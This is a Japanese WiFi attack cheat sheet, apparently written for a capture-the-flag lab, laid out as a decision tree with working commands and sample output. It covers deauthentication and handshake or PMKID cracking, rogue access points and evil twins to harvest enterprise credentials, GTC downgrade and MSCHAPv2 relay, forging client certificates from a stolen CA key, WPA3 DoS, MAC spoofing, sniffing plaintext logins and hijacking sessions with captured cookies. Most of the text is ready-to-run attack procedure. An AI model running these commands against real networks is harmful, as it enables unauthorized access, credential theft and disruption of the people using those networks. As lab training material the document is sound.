# WiFi Wi-Fiハッキングの木

**免責事項:** 本コンテンツは教育目的および許可されたセキュリティテストのみを目的としています。所有していないネットワーク、または明示的な書面による許可を得ていないネットワークに対してこれらの技術を使用しないでください。著者は、誤用、損害、または法的結果について一切の責任を負いません。常に適用される法律および規制を遵守してください。

---

<a name="master-tree"></a>
## 1. マスター決定木

```
┌─────────────────────────────────────────────────────────────────────┐
│                   開始: WiFi ペネトレーションテスト                    │
│              目標: AP または Web サーバーからフラグを取得              │
└─────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────────┐
│  ステップ 0: 環境セットアップ                                         │
│  • airmon-ng check kill                                             │
│  • モニターインターフェースの作成                                      │
│  • 周辺ネットワークの調査                                             │
└─────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────────┐
│  ステップ 1: 列挙 (airodump-ng --band abg)                          │
│  出力: BSSID, CH, ENC, CIPHER, AUTH, WPS, ESSID                     │
│  クライアント: STATION, Probes, Notes                                │
└─────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
        ┌─────────────────────┼─────────────────────┐
        │                     │                     │
        ▼                     ▼                     ▼
   ┌─────────┐          ┌──────────┐         ┌──────────┐
   │  OPN    │          │   WEP    │         │ WPA2-PSK │
   │(オープン)│          │ (レガシー)│         │ (暗号化) │
   └────┬────┘          └────┬─────┘         └────┬─────┘
        │                     │                    │
        │                     │                    ├── クライアントあり？
        │                     │                    │    ├── はい → Deauth + Handshake + Crack
        │                     │                    │    └── いいえ → PMKID (hcxdumptool)
        │                     │                    │
        │                     │                    ├── ネットワーク不在 + Probe あり？
        │                     │                    │    └── はい → Rogue AP (hostapd-mana)
        │                     │                    │
        │                     │                    └── WPS 有効？
        │                     │                         └── はい → reaver -K 1
        │                     │
        │                     ├── アクティブクライアントあり？
        │                     │    ├── はい → besside-ng (自動)
        │                     │    └── いいえ → Fake Auth + ARP Replay
        │                     │
        │                     └── 手動 WEP:
        │                          aireplay-ng -1 (Fake Auth)
        │                          aireplay-ng --arpreplay
        │                          aircrack-ng
        │
        ├── Captive Portal あり？
        │    ├── はい → MAC Spoofing + HTTP Sniff + Credential
        │    └── いいえ → 接続 + admin/admin + ルーターフラグ
        │
        └── ポストエクスプロイテーション:
             • airdecap-ng (トラフィック復号)
             • tshark (Cookie、Credential 抽出)
             • arp-scan (Client Isolation テスト)
             • curl -b "cookie" (Session Hijacking)

        ┌─────────────────────┼─────────────────────┐
        │                     │                     │
        ▼                     ▼                     ▼
   ┌─────────┐          ┌──────────┐         ┌──────────────┐
   │ WPA3-   │          │   MGT    │         │     OWE      │
   │ SAE     │          │(エンタープライズ)│   │ (Enhanced    │
   │         │          │          │         │  Open)       │
   └────┬────┘          └────┬─────┘         └──────┬───────┘
        │                    │                      │
        ├── Transition Mode  │                      ├── 直接接続 (key_mgmt=OWE)
        │   (WPA2+WPA3)?     │                      │   → 99% 成功
        │   └── はい →        │                      │
        │   Deauth + Handshake│                     └── 失敗した場合:
        │   + Crack (WPA2)   │                          DragonDrain (DoS)
        │                    │                          → リトライ
        └── WPA3-only?       │
            └── wacker.py    │
                (オンライン)  │
                             │
                             ├── 1. パッシブ偵察 (攻撃なし):
                             │   tshark → eap.identity (ユーザー名)
                             │   tshark → tls.certificate (サーバー証明書)
                             │   → メール、CN、ドメイン
                             │
                             ├── 2. EAP メソッドの特定:
                             │   tshark -Y "eap" -e eap.type
                             │   ├── 4  → EAP-MD5 → hcxpcapngtool + hashcat 4800
                             │   ├── 13 → EAP-TLS → クライアント証明書 (Rogue AP)
                             │   ├── 21 → EAP-TTLS → eaphammer + asleap
                             │   ├── 25 → PEAP → eaphammer + asleap
                             │   ├── 6  → EAP-GTC → gtc-downgrade
                             │   ├── 18 → EAP-SIM → IMSI 抽出
                             │   ├── 23 → EAP-AKA → IMSI 抽出
                             │   └── 50 → EAP-AKA' → IMSI 抽出
                             │
                             ├── 3. メソッド別の攻撃:
                             │   ├── PEAP/TTLS:
                             │   │   ├── eaphammer --creds → MSCHAPv2
                             │   │   ├── asleap/hashcat -m 5500
                             │   │   └── または gtc-downgrade → 平文
                             │   │
                             │   ├── EAP-TLS:
                             │   │   ├── 本物のサーバー証明書あり？
                             │   │   │   ├── はい → eaphammer --cert-wizard import
                             │   │   │   └── いいえ → hostapd-wpe (任意の証明書受理)
                             │   │   ├── CA.key あり？
                             │   │   │   └── はい → 任意ユーザーの偽証明書生成
                             │   │   └── 偽証明書で接続 → フラグ
                             │   │
                             │   └── Relay (PEAP):
                             │       berate_ap --wpa-sycophant
                             │       + wpa_sycophant
                             │       + 脆弱なクライアントに Deauth
                             │
                             ├── 4. オンラインブルートフォース:
                             │   air-hammer (ユーザー × パス)
                             │   または air-hammer (ユーザーリスト × 単一パス)
                             │
                             └── 5. Evil Twin / フィッシング:
                                 クライアントが別ネットワークを Probe 中？
                                 └── eaphammer --captive-portal
                                     または --hostile-portal
                                     → hashcat -m 5600 (NetNTLMv2)
                                     → または POST から平文取得
```

---

<a name="setup"></a>
## 2. 環境セットアップとツール

### 2.1. 無線カードの完全リセット

```bash
# 干渉するプロセスを終了
sudo pkill wpa_supplicant
sudo pkill dhclient
sudo pkill hostapd
sudo pkill eaphammer
sudo pkill aireplay-ng
sudo pkill airodump-ng
sudo pkill berate_ap
sudo pkill dnsmasq

# NetworkManager と airmon をリセット
sudo systemctl stop NetworkManager
sudo airmon-ng check kill

# すべての仮想インターフェースを削除
for i in $(iw dev | grep Interface | awk '{print $2}'); do
    sudo ip link set $i down 2>/dev/null
    sudo iw dev $i del 2>/dev/null
done

# ドライバをリセット (WiFiChallengeLab の場合: mac80211_hwsim)
sudo modprobe -r mac80211_hwsim && sleep 2 && sudo modprobe mac80211_hwsim

# NetworkManager を再起動 (オプション)
sudo systemctl start NetworkManager
```

### 2.2. モニターインターフェースの作成

```bash
# 方法 1: airmon-ng (最も簡単)
sudo airmon-ng start wlan0

# 方法 2: 手動 (airmon-ng が失敗した場合)
sudo iw phy phy0 interface add wlan0mon type monitor
sudo ip link set wlan0mon up
sudo iw dev wlan0mon set channel 44  # チャンネルが判明している場合

# 確認
iw dev
iw dev wlan0mon info   # type monitor が表示されるはず
```

### 2.3. 重要な注意: 共有インターフェース

> ⚠️ **重要な警告:** `wlan0mon` が `wlan0` (managed) と同じ `phy` 上にある場合、`hcxdumptool` などのツールは `failed to arm interface` で失敗します。
>
> **解決策:** 別の `phy` 上に専用のモニターインターフェースを作成します:
> ```bash
> # 例: hcxdumptool 用に phy70
> sudo iw phy phy70 interface add wlan6mon type monitor
> sudo ip link set wlan6mon up
> ```

---

<a name="recon"></a>
## 3. フェーズ 0: 列挙と偵察

### 3.1. 包括的なスキャン

```bash
sudo airodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg
```

**重要な AP カラム:**

| カラム | 意味 | 値 |
|------|------|--------|
| **BSSID** | ルーター MAC | `F0:9F:C2:...` |
| **PWR** | 信号強度 | 0 に近いほど強い |
| **CH** | チャンネル | `1`, `6`, `11`, `44`, `48` |
| **ENC** | 暗号化 | `OPN`, `WEP`, `WPA2`, `WPA3` |
| **CIPHER** | アルゴリズム | `CCMP`, `TKIP`, `WEP` |
| **AUTH** | 認証 | `PSK`, `MGT`, `SAE`, `OWE` |
| **WPS** | WPS サポート | `0.0` (なし), `2.0` (あり) |
| **ESSID** | ネットワーク名 | `<length: 9>` = 隠し |

**重要なクライアントカラム:**

| カラム | 意味 | 用途 |
|------|------|--------|
| **STATION** | クライアント MAC | Deauth ターゲット |
| **Probes** | 探索中のネットワーク | 🎯 **Evil Twin のための金鉱** |
| **Notes** | `PMKID` または `WPA handshake` | 成功指標 |
| `(not associated)` | 未接続 | スキャン中 |

### 3.2. 出力の保存と分析

```bash
# 出力: scan-01.cap, scan-01.csv, scan-01.kismet.*
ls ~/wifi/

# CSV を検索
cat ~/wifi/scan-01.csv | grep "wifi-global"

# tshark で抽出
tshark -r ~/wifi/scan-01.cap -Y "wlan.fc.type_subtype == 4" -T fields -e wlan.sa -e wlan.ssid -e radiotap.channel.freq
```

### 3.3. 補助偵察ツール

```bash
# 1. WiFi_db (SQLITE データベース)
git clone https://github.com/r4ulcl/wifi_db.git
cd wifi_db
sudo python3 wifi_db.py -d ~/wifi/wifichallenge.SQLITE ~/wifi/
sudo sqlitebrowser ~/wifi/wifichallenge.SQLITE

# 2. wash (WPS チェック)
sudo wash -i wlan0mon -c <CH>

# 3. iw scan (RSN Capabilities - PMF チェック)
sudo iw dev wlan2 scan | grep -A 20 "wifi-IT" | grep -A 6 "RSN"
```

### 3.4. RSN Capabilities の解釈 (MFP/PMF 検出)

```
RSN Capabilities: 0x008c = 0000 0000 1000 1100
                    │                ││││
                    │                │││└── bit 2: 16-PTKSA-RC
                    │                ││└─── bit 3: 1-GTKSA-RC  
                    │                └┴──── bit 6,7: MFPR/MFPC
```

| MFPC (bit 7) | MFPR (bit 6) | 意味 | Deauth は効く？ |
|:---:|:---:|------|:---:|
| 0 | 0 | PMF 無効 | ✅ はい |
| 1 | 0 | PMF オプション | ✅ はい (MFP 非対応クライアントに対して) |
| 1 | 1 | PMF 必須 | ❌ いいえ |

---

<a name="opn"></a>
## 4. フェーズ 1: OPN ブランチ (オープンネットワーク)

```
OPN (ENC = OPN)
│
├── Captive Portal あり？
│   │
│   ├── はい → MAC Spoofing + HTTP Sniff
│   │   ├── 1. スキャンして有効なクライアント MAC を発見
│   │   ├── 2. macchanger -m <CLIENT_MAC> wlan2
│   │   ├── 3. wpa_supplicant (key_mgmt=NONE)
│   │   ├── 4. dhclient (IP 取得)
│   │   ├── 5. airodump-ng -c <CH> -w capture
│   │   ├── 6. Wireshark → http.request.method == POST
│   │   └── 7. ユーザー/パス抽出 → ログイン → フラグ
│   │
│   └── いいえ → 直接接続
│       ├── wpa_supplicant → dhclient
│       ├── ip route (ゲートウェイを発見)
│       └── http://<gateway> → admin/admin → フラグ
```

### 4.1. オープンネットワーク設定

```conf
# free.conf
network={
    ssid="wifi-free"
    key_mgmt=NONE
    scan_ssid=1
}
```

### 4.2. 接続コマンド

```bash
# 接続
sudo wpa_supplicant -Dnl80211 -iwlan2 -c free.conf -B

# IP 取得
sudo dhclient wlan2 -v

# 確認
ip a show wlan2
ip route | grep default
```

### 4.3. MAC Spoofing による Captive Portal バイパス

```bash
# 1. airodump-ng からアクティブなクライアント MAC を発見
# (Frames の多い STATION カラム)

# 2. NetworkManager を停止して MAC を変更
sudo systemctl stop network-manager
sudo ip link set wlan2 down
sudo macchanger -m b0:72:bf:44:b0:49 wlan2
sudo ip link set wlan2 up

# 3. 再接続 (MAC が許可リストにあればログイン不要)
sudo wpa_supplicant -Dnl80211 -iwlan2 -c free.conf -B
sudo dhclient wlan2 -v
```

### 4.4. HTTP スニッフィングと認証情報の抽出

```bash
# ターゲットチャンネルでキャプチャ
sudo airodump-ng wlan0mon -c 6 -w ~/wifi/capture

# ユーザーログインを待つ (3〜5 分)

# Wireshark で分析
wireshark ~/wifi/capture-01.cap
# フィルター: http.request.method == "POST"

# または tshark で
tshark -r ~/wifi/capture-01.cap -Y "http.request.method == \"POST\"" -T fields -e http.file_data
```

**出力例:**
```
Username=free1&Password=Jyl1iq8UajZ1fEK&Submit=Login
```

---

<a name="wep"></a>
## 5. フェーズ 2: WEP ブランチ

```
WEP (ENC = WEP)
│
├── 自動化メソッド (最速)
│   └── besside-ng -c <CH> -b <BSSID> wlan2 -v
│       (Fake Auth + ARP Replay + IV 収集 + クラックを実行)
│
└── 手動メソッド (besside-ng が失敗した場合)
    │
    ├── 1. データキャプチャ
    │   └── airodump-ng -c <CH> --bssid <BSSID> -w ~/wifi/wep wlan0mon
    │
    ├── 2. Fake Auth
    │   └── aireplay-ng -1 3600 -q 10 -a <BSSID> wlan0mon
    │
    ├── 3. ARP Replay
    │   └── aireplay-ng --arpreplay -b <BSSID> -h <YOUR_MAC> wlan0mon
    │
    ├── 4. IV 収集を待つ (20,000〜50,000)
    │
    ├── 5. クラック
    │   └── aircrack-ng ~/wifi/wep-01.cap
    │
    └── 6. 接続
        └── wpa_supplicant with wep_key0
```

### 5.1. besside-ng による自動化メソッド

```bash
sudo besside-ng -c 3 -b F0:9F:C2:71:22:11 wlan2 -v
```

**成功時の出力:**
```
[02:35:38] Got key for wifi-old [11:bb:33:cd:55] 30044 IVs
[02:35:38] Pwned network wifi-old in 4:22 mins:sec
```

### 5.2. 手動メソッド (ステップバイステップ)

```bash
# 1. キャプチャ
sudo airodump-ng -c 3 --bssid F0:9F:C2:71:22:11 -w ~/wifi/wifi-old wlan0mon

# 2. Fake Auth (ターミナル 2)
sudo aireplay-ng -1 3600 -q 10 -a F0:9F:C2:71:22:11 wlan0mon

# 3. ARP Replay (ターミナル 3)
sudo aireplay-ng --arpreplay -b F0:9F:C2:71:22:11 -h BA:49:A9:53:A1:8C wlan0mon

# 4. ARP がない場合、Deauth を送信
sudo aireplay-ng --deauth 5 -a F0:9F:C2:71:22:11 -c <CLIENT_MAC> wlan0mon

# 5. クラック
sudo aircrack-ng ~/wifi/wifi-old-01.cap
```

### 5.3. WEP に接続

```conf
# wep.conf
network={
    ssid="wifi-old"
    key_mgmt=NONE
    wep_key0=11bb33cd55
    wep_tx_keyidx=0
}
```

```bash
sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/wep.conf -B
sudo dhclient wlan2 -v
```

### 5.4. ライトアップに含まれない WEP 攻撃 (ただし重要!)

| 攻撃 | ツール | 用途 |
|------|-------|--------|
| **Fragmentation** | `aireplay-ng -5` | ARP なしで IV 生成 |
| **ChopChop** | `aireplay-ng -4` | ARP なしでクラック |
| **KoreK** | `aircrack-ng -K` | レガシー手法 |
| **PTW** | `aircrack-ng` (デフォルト) | 最速手法 |

---

<a name="wpa2"></a>
## 6. フェーズ 3: WPA2-PSK ブランチ

```
WPA2-PSK (ENC=WPA2, AUTH=PSK)
│
├── 接続中のクライアントあり？
│   │
│   ├── はい → Deauth + Handshake + Crack
│   │   ├── 1. airodump-ng -c <CH> --bssid <BSSID> -w capture
│   │   ├── 2. aireplay-ng -0 10 -a <BSSID> -c <CLIENT>
│   │   ├── 3. [WPA handshake: ...] を待つ
│   │   ├── 4. aircrack-ng capture-01.cap -w rockyou.txt
│   │   └── 5. 接続 + airdecap-ng + ポストエクスプロイト
│   │
│   ├── いいえ → PMKID 攻撃 (クライアントレス)
│   │   ├── hcxdumptool -i wlan6mon -w pmkid.pcapng -c <CH>a --rds=2 -A
│   │   ├── hcxpcapngtool -o pmkid.22000 pmkid.pcapng
│   │   └── hashcat -m 22000 -a 0 pmkid.22000 rockyou.txt
│   │
│   └── ネットワーク不在 + クライアント Probe あり？
│       └── Rogue AP (hostapd-mana)
│           ├── hostapd-mana with essid=target, wpa_passphrase=12345678
│           ├── mana_wpaout=hostapd.hccapx
│           ├── クライアントに Deauth
│           ├── hashcat -m 22000 hostapd.hccapx
│           └── 接続
│
└── WPS 有効？ (WPS カラム = 2.0)
    └── WPS ブランチへ
```

### 6.1. Handshake のキャプチャ

```bash
# 1. ターゲットチャンネルにロック
sudo airodump-ng wlan0mon -c 6 --bssid F0:9F:C2:71:22:12 -w ~/wifi/psk

# 2. 別ターミナルで Deauth
sudo aireplay-ng -0 10 -a F0:9F:C2:71:22:12 -c <CLIENT_MAC> wlan0mon

# 3. airodump の上部に成功メッセージが表示されるのを待つ:
# [ WPA handshake: F0:9F:C2:71:22:12 ]

# 4. クラック
aircrack-ng ~/wifi/psk-01.cap -w /root/rockyou-top100000.txt
```

**成功時の出力:**
```
KEY FOUND! [ starwars1 ]
```

### 6.2. PMKID 攻撃 (クライアントレス)

```bash
# 1. 専用のモニターインターフェースを作成 (重要!)
sudo iw phy phy70 interface add wlan6mon type monitor
sudo ip link set wlan6mon up
sudo iw dev wlan6mon set channel 7

# 2. hcxdumptool を実行
sudo hcxdumptool -i wlan6mon -w pmkid.pcapng -c 7a --rds=2 -A

# 3. ハッシュを抽出
hcxpcapngtool -o pmkid.22000 pmkid.pcapng

# 4. クラック
hashcat -m 22000 -a 0 pmkid.22000 /root/rockyou-top100000.txt --force
```

### 6.3. 不在ネットワーク用の Rogue AP (hostapd-mana)

**シナリオ:** `wifi-offices` ネットワークは利用不可だが、クライアントはまだ Probe Request を送信している。

```bash
# 1. hostapd-mana の設定
nano hostapd.conf
```

```conf
interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=wifi-offices
mana_wpaout=hostapd.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
```

```bash
# 2. Rogue AP を実行
sudo hostapd-mana hostapd.conf

# 3. 実 AP からクライアントに Deauth (存在する場合)
sudo aireplay-ng -0 10 -a <REAL_BSSID> -c <CLIENT_MAC> wlan0mon

# 4. クライアントが接続すると、Handshake が hostapd.hccapx に保存される

# 5. クラック
hashcat -a 0 -m 22000 hostapd.hccapx /root/rockyou-top100000.txt --force
```

**注意:** `hashcat -m 2500` がエラーを出す場合:
```bash
# hccapx を pcap に変換
hcxhash2cap --hccapx=hostapd.hccapx -c aux.pcap
# 22000 を抽出
hcxpcapngtool aux.pcap -o hash.22000
# クラック
hashcat -m 22000 hash.22000 rockyou.txt
```

### 6.4. 接続 + 復号 + ポストエクスプロイト

```conf
# psk.conf
network={
    ssid="wifi-mobile"
    psk="starwars1"
}
```

```bash
# 接続
sudo wpa_supplicant -Dnl80211 -iwlan3 -c psk.conf -B
sudo dhclient wlan3 -v

# トラフィックを復号
airdecap-ng -e wifi-mobile -p starwars1 ~/wifi/psk-01.cap
# 出力: psk-01-dec.cap

# 分析
wireshark ~/wifi/psk-01-dec.cap
# フィルター: http

# Cookie を抽出
tshark -r ~/wifi/psk-01-dec.cap -Y "http.cookie" -T fields -e http.cookie

# Cookie を使用
curl -i -b "PHPSESSID=296228e3896440bd508d4c69e11e265c" http://192.168.2.1/
```

### 6.5. Client Isolation のテスト

```bash
# ネットワークに接続
sudo wpa_supplicant -Dnl80211 -iwlan3 -c psk.conf -B
sudo dhclient wlan3 -v

# ARP スキャン
sudo arp-scan -I wlan3 -l

# 別クライアントのサーバーへのアクセスをテスト
curl -s -m 3 http://192.168.2.7/ | grep -o 'flag{[^}]*}'
```

---

<a name="wpa3"></a>
## 7. フェーズ 4: WPA3-SAE ブランチ

```
WPA3-SAE (ENC=WPA3, AUTH=SAE)
│
├── Transition Mode (WPA2+WPA3)?
│   │   (RSN Auth Suites: PSK SAE)
│   │
│   ├── はい → ダウングレード攻撃
│   │   ├── 1. WPA2-PSK で Rogue AP を構築
│   │   ├── 2. hostapd-mana with wpa_key_mgmt=WPA-PSK
│   │   ├── 3. クライアントに Deauth (PMF 無効の場合)
│   │   ├── 4. クライアントが偽 AP に接続
│   │   ├── 5. WPA2 Handshake キャプチャ
│   │   └── 6. hashcat -m 22000 (高速!)
│   │
│   └── WPA3-only
│       └── wacker.py (オンラインブルートフォース)
│           ├── ./wacker.py --wordlist rockyou.txt --ssid <SSID>
│           │              --bssid <BSSID> --interface wlan2 --freq 2462
│           ├── "Found the password" を待つ
│           └── key_mgmt=SAE, ieee80211w=2 で接続
│
└── PMF 必須 (MFP-required)?
    ├── はい → Deauth は効かない
    │         → Dragonblood DoS (dragondrain)
    └── いいえ → Deauth 可能
```

### 7.1. Transition Mode の検出

```bash
sudo iw dev wlan2 scan | grep -A 15 "wifi-IT"
```

**出力:**
```
RSN: * Authentication suites: PSK SAE
     * Capabilities: MFP-capable (0x008c)
```

| Auth Suites | Capabilities | 解釈 |
|-------------|--------------|--------|
| `PSK SAE` | MFP-capable | Transition Mode ✅ |
| `SAE` | MFP-required | WPA3-only ❌ |

### 7.2. ダウングレード攻撃 (Transition Mode)

```conf
# hostapd-sae.conf
interface=wlan1
driver=nl80211
hw_mode=g
channel=11
ssid=wifi-IT
mana_wpaout=hostapd-management.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK     # ← WPA2、SAE ではない!
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
```

```bash
# 1. Rogue AP を実行
sudo hostapd-mana hostapd-sae.conf

# 2. クライアントに Deauth
sudo aireplay-ng -0 0 -a F0:9F:C2:1A:CA:25 -c 10:F9:6F:AC:53:52 wlan0mon

# 3. Handshake をクラック
hashcat -a 0 -m 2500 hostapd-management.hccapx rockyou.txt --force
```

### 7.3. wacker.py (オンラインブルートフォース)

```bash
# インストール
git clone https://github.com/blunderbuss-wctf/wacker.git
cd wacker

# 実行
./wacker.py --wordlist ~/rockyou-top100000.txt \
            --ssid wifi-management \
            --bssid F0:9F:C2:11:0A:24 \
            --interface wlan2 \
            --freq 2462
```

**注意:** `--freq` は AP の周波数 (チャンネルではない):
- チャンネル 11 → 2462 MHz
- チャンネル 6 → 2437 MHz
- チャンネル 1 → 2412 MHz

### 7.4. WPA3-SAE への接続

```conf
# wpa3.conf
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
update_config=1
network={
    ssid="wifi-management"
    key_mgmt=SAE
    proto=RSN
    pairwise=CCMP
    group=CCMP
    psk="chocolate1"
    ieee80211w=2      # ← PMF 必須!
}
```

```bash
sudo wpa_supplicant -i wlan2 -c wpa3.conf -B
sudo dhclient -v wlan2
```

### 7.5. Dragonblood DoS (WPA3-only、PMF 必須)

```bash
# インストール
cd /root/tools/dragondrain-and-time/
autoreconf -i && ./configure && make

# 実行
cd /root/tools/dragondrain-and-time/src/
sudo ./dragondrain -d wlan1mon -a F0:9F:C2:71:AF:2F -c 44 -b 54 -n 1 -r 200
```

**成功指標:** `[ STATUS: 200 forged handshakes/sec ]`

---

<a name="mgt"></a>
## 8. フェーズ 5: WPA2-Enterprise (MGT) ブランチ

```
WPA2-Enterprise (AUTH=MGT)
│
├── フェーズ 0: パッシブ偵察 (攻撃なし)
│   ├── tshark -r cap -Y "eap.identity" -T fields -e eap.identity
│   │   → ユーザー名 (例: GLOBAL\GlobalAdmin)
│   │
│   └── tshark -r cap -Y "tls.handshake.certificate" -T fields -e tls.handshake.certificate
│       | xxd -r -p | openssl x509 -inform DER -noout -subject
│       → CN, O, emailAddress
│
├── フェーズ 1: EAP メソッドの特定
│   └── tshark -r cap -Y "eap" -T fields -e eap.type | sort | uniq -c
│       ├── 4  → EAP-MD5
│       ├── 6  → EAP-GTC
│       ├── 13 → EAP-TLS
│       ├── 21 → EAP-TTLS
│       ├── 25 → PEAP
│       ├── 18 → EAP-SIM
│       ├── 23 → EAP-AKA
│       └── 50 → EAP-AKA'
│
└── フェーズ 2: メソッド別の攻撃
    │
    ├── EAP-MD5 (コード 4)
    │   ├── hcxpcapngtool --eapmd5=legacy.hc4800 capture.cap
    │   └── hashcat -m 4800 -a 0 legacy.hc4800 rockyou.txt
    │
    ├── PEAP (コード 25) または EAP-TTLS (コード 21)
    │   │
    │   ├── 方法 1: Evil Twin (eaphammer)
    │   │   ├── eaphammer --cert-wizard (証明書生成)
    │   │   ├── eaphammer -i wlan2 --auth wpa-eap --essid "target"
    │   │   │            --creds --autocrack --wordlist rockyou.txt
    │   │   └── クライアントに Deauth
    │   │
    │   ├── 方法 2: GTC ダウングレード (クライアントが証明書を検証する場合)
    │   │   ├── eaphammer --creds --negotiate gtc-downgrade
    │   │   └── ログに平文パスワード
    │   │
    │   └── 方法 3: Relay 攻撃
    │       ├── berate_ap --wpa-sycophant wlan1 lo target
    │       └── wpa_sycophant -c conf -i wlan3
    │
    ├── EAP-TLS (コード 13)
    │   │
    │   ├── ケース 1: 本物のサーバー証明書あり
    │   │   └── eaphammer --cert-wizard import
    │   │       --server-cert server.crt --ca-cert ca.crt --private-key server.key
    │   │
    │   ├── ケース 2: CA.key あり (最良!)
    │   │   ├── openssl genrsa -out fake.key 2048
    │   │   ├── openssl req -new -key fake.key -out fake.csr
    │   │   └── openssl x509 -req -in fake.csr -CA ca.crt -CAkey ca.key -out fake.crt
    │   │
    │   └── ケース 3: 何もなし
    │       └── hostapd-wpe (任意の証明書を受理)
    │
    ├── EAP-GTC (コード 6)
    │   └── eaphammer --creds --negotiate gtc-downgrade
    │
    ├── EAP-SIM/AKA/AKA' (コード 18/23/50)
    │   ├── 1. パッシブ: tshark -Y "eap.identity"
    │   ├── 2. IMSI のみ必要な場合:
    │   │   ├── hostapd with eap_sim_id=0
    │   │   ├── sim_db with fake IMSI
    │   │   └── tshark -Y "eap.type == 50" -V | grep IMSI
    │   └── 3. Identity から IMSI を抽出
    │
    └── オンラインブルートフォース (任意のメソッド)
        ├── air-hammer -i wlan3 -e target -p rockyou.txt -u userlist
        └── air-hammer -i wlan3 -e target -P 12345678 -u userlist
```

### 8.1. パッシブ偵察 (ユーザー名と証明書の抽出)

```bash
# 1. Identity からユーザー名
tshark -r ~/wifi/scanc44-01.cap -Y "eap.identity" -T fields -e eap.identity | sort -u
# 出力: GLOBAL\GlobalAdmin, anonymous@CONTOSOREG, ...

# 2. サーバー証明書
tshark -r ~/wifi/global-01.cap \
  -Y "tls.handshake.certificate && wlan.sa == F0:9F:C2:71:22:17" \
  -T fields -e tls.handshake.certificate 2>/dev/null \
  | head -n 1 | xxd -r -p \
  | openssl x509 -inform DER -noout -subject -nameopt RFC2253
```

**出力例:**
```
subject=emailAddress=server@WiFiChallenge.com,CN=radius.wifichallenge.com,
        OU=Server,O=WiFiChallenge,L=Madrid,ST=Madrid,C=ES
```

### 8.2. EAP メソッドの特定

```bash
tshark -r capture.cap -Y "eap" -T fields -e eap.type | sort | uniq -c
```

**EAP コード表:**

| コード | メソッド | 攻撃 |
|:--:|--------|------|
| 1 | Identity | パッシブ (ユーザー名) |
| 4 | EAP-MD5 | hashcat -m 4800 |
| 6 | EAP-GTC | gtc-downgrade |
| 13 | EAP-TLS | クライアント証明書 |
| 18 | EAP-SIM | IMSI 抽出 |
| 21 | EAP-TTLS | eaphammer + asleap |
| 23 | EAP-AKA | IMSI 抽出 |
| 25 | PEAP | eaphammer + asleap |
| 50 | EAP-AKA' | IMSI 抽出 |

### 8.3. EAP-MD5 (最も簡単)

```bash
# ハッシュを抽出
hcxpcapngtool --eapmd5=legacy.hc4800 legacy-01.cap

# クラック
hashcat -m 4800 -a 0 legacy.hc4800 /root/rockyou-top100000.txt
```

### 8.4. PEAP/TTLS (最も一般的)

```bash
cd /root/tools/eaphammer

# 1. 偽証明書を生成 (本物の証明書の詳細を使用)
sudo python3 eaphammer --cert-wizard

# 2. Rogue AP を実行
sudo python3 eaphammer -i wlan2 \
  --channel 44 \
  --auth wpa-eap \
  --essid "wifi-corp" \
  --creds \
  --autocrack \
  --wordlist /root/rockyou-top100000.txt

# 3. クライアントに Deauth (別ターミナル)
sudo aireplay-ng -0 10 -a F0:9F:C2:71:22:1A -c 64:32:A8:07:6C:40 wlan0mon

# 4. クライアントが証明書を検証する場合 (unknown CA エラー):
sudo python3 eaphammer -i wlan2 \
  --channel 44 \
  --auth wpa-eap \
  --essid "wifi-corp" \
  --creds \
  --negotiate gtc-downgrade
```

**MSCHAPv2 出力:**
```
domain\username:  CONTOSO\juan.tr
challenge:        3b:04:8b:cb:93:78:9a:e3
response:         99:7e:f7:19:b2:b7:2f:e9:15:42:32:88:77:76:ab:a6:3d:ed:28:85:87:33:0a:62
hashcat NETNTLM:  juan.tr::::997ef...:3b048...
```

```bash
# 手動クラック
echo 'juan.tr::::997ef...:3b048...' > hash.5500
hashcat -a 0 -m 5500 hash.5500 rockyou.txt --force
```

### 8.5. EAP-TLS (最も難しい)

#### ケース A: 本物のサーバー証明書あり

```bash
cd /root/tools/eaphammer

# 本物の証明書をインポート
sudo python3 ./eaphammer --cert-wizard import \
  --server-cert /home/user/Downloads/server.crt \
  --ca-cert /home/user/Downloads/ca.crt \
  --private-key /home/user/Downloads/server.key

# Rogue AP を実行
sudo python3 ./eaphammer -i wlan4 --auth wpa-eap --essid "wifi-corp" \
  --creds --negotiate balanced

# Deauth
sudo aireplay-ng -0 0 -a F0:9F:C2:71:22:1A -c 64:32:A8:BA:6C:41 wlan0mon
```

#### ケース B: CA.key あり (最良!)

```bash
# 任意ユーザーの偽証明書を生成
openssl genrsa -out client.key 2048
openssl req -config client.conf -new -key client.key -out client.csr
openssl x509 -days 730 -extfile client.ext \
  -CA ca.crt -CAkey ca.key -CAserial ca.serial \
  -in client.csr -req -out client.crt
```

```conf
# wpa_tls.conf
network={
    ssid="wifi-global"
    scan_ssid=1
    proto=RSN
    key_mgmt=WPA-EAP
    eap=TLS
    identity="GLOBAL\GlobalAdmin"
    ca_cert="./ca.crt"
    client_cert="./client.crt"
    private_key="./client.key"
}
```

```bash
sudo wpa_supplicant -Dnl80211 -i wlan3 -c ~/Downloads/wpa_tls.conf -B
sudo dhclient wlan3 -v
```

### 8.6. Relay 攻撃 (PEAP)

**シナリオ:** クライアントが偽証明書を拒否。ハッシュを本物の AP に中継する。

```bash
# ターミナル 1: Rogue AP
cd ~/tools/berate_ap/
sudo ./berate_ap --eap --mana-wpe --wpa-sycophant \
  --mana-credout outputMana.log -c 44 wlan1 lo wifi-regional-tablets

# ターミナル 2: Relay
cd ~/tools/wpa_sycophant/
sudo ./wpa_sycophant.sh -c wpa_sycophant_example.conf -i wlan3

# ターミナル 3: Deauth
sudo aireplay-ng --ignore-negative-one -0 0 \
  -a F0:9F:C2:7A:33:28 -c 64:32:A8:A9:DE:55 wlan0mon
```

**`wpa_sycophant_example.conf`:**
```conf
network={
  ssid="wifi-regional"     # ← 侵入したいネットワーク
  scan_ssid=1
  key_mgmt=WPA-EAP
  identity=""
  anonymous_identity=""
  password=""
  eap=PEAP
  phase1="peapver=1"
  phase2="auth=MSCHAPV2"
